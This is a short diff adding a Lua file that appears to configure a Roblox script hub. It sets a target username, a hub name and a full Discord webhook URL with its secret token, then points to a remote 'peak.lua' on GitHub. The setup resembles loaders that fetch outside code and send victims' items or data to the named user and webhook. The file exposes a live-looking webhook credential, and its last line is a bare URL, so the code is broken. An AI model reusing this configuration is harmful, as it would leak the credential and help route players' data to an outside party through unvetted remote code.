@@ -1,0 +1,9 @@
+-- main.lua
+
+_G.Username = "TAzenoyt"
+
+_G.HubName = "Sentinel Scripts v.2.3"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1155691506661871738/cFtxu0U47W5nSfij92bxl8Wz0ATWwe1yDAuKhoyN7Y5M40DbZGQJtiK3yyT1l9WMogl_"
+
+https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua
